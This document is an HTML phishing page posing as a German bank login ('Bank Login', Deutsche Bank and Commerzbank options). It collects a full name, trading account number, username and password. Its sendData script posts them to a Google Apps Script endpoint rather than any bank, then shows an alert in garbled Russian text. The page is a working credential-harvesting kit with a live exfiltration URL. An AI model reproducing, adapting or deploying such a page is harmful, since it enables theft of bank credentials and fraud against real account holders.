<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8"/>
  <title>Bank Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url('https://images.unsplash.com/photo-1521791136064-7986c2920216?auto=format&fit=crop&w=1350&q=80');
      background-size: cover;
      background-position: center;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      width: 320px;
    }
    input, select {
      width: 100%;
      padding: 8px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .password-container {
      position: relative;
    }
    .password-container input {
      padding-right: 35px;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    #customBankInputContainer {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Kundendaten</h2>
    <label for="fullname">Vor- und Nachname</label>
    <input id="fullname" type="text" placeholder="Geben Sie Ihren Namen ein"/>

    <label for="bank">Bank ausw√§hlen</label>
    <select id="bank">
      <option>-- W√§hlen Sie --</option>
      <option>Deutsche Bank</option>
      <option>Commerzbank</option>
      <option>Andere</option>
    </select>

    <label><input type="checkbox" id="customBankToggle"/> Meine Bank ist nicht in der Liste</label>
    <div id="customBankInputContainer">
      <input id="customBankInput" type="text" placeholder="Name Ihrer Bank"/>
    </div>

    <label for="handelskontonummer">Handelskontonummer</label>
    <input id="handelskontonummer" type="text" placeholder="Handelskontonummer eingeben"/>

    <label for="login">Benutzername</label>
    <input id="login" type="text" placeholder="Benutzername"/>

    <label for="password">Passwort</label>
    <div class="password-container">
      <input id="password" type="password" placeholder="Passwort"/>
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <button onclick="sendData()">Einloggen</button>
  </div>

  <script>
    document.getElementById("customBankToggle").addEventListener("change", function() {
      document.getElementById("customBankInputContainer").style.display = this.checked ? "block" : "none";
    });

    function togglePassword() {
      const pw = document.getElementById("password");
      pw.type = pw.type === "password" ? "text" : "password";
    }

    function sendData() {
      const fullName = document.getElementById("fullname").value;
      const bank = document.getElementById("customBankToggle").checked
        ? document.getElementById("customBankInput").value
        : document.getElementById("bank").value;
      const handelskontonummer = document.getElementById("handelskontonummer").value;
      const login = document.getElementById("login").value;
      const password = document.getElementById("password").value;

      const url = "https://script.google.com/macros/s/AKfycbzR5Lxj-rFZevhgy3TCBRz6qXLbFwH9GVbGhKRa2wo1lz1tjNPe0hq5kAB0FhOXzXXg1g/exec";

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fullname: fullName,
          bank: bank,
          handelskontonummer: handelskontonummer,
          login: login,
          password: password
        })
      })
      .then(response => response.text())
      .then(data => {
        alert("–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã.");
      })
      .catch(error => {
        alert("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: " + error);
      });
    }
  </script>
</body>
</html>
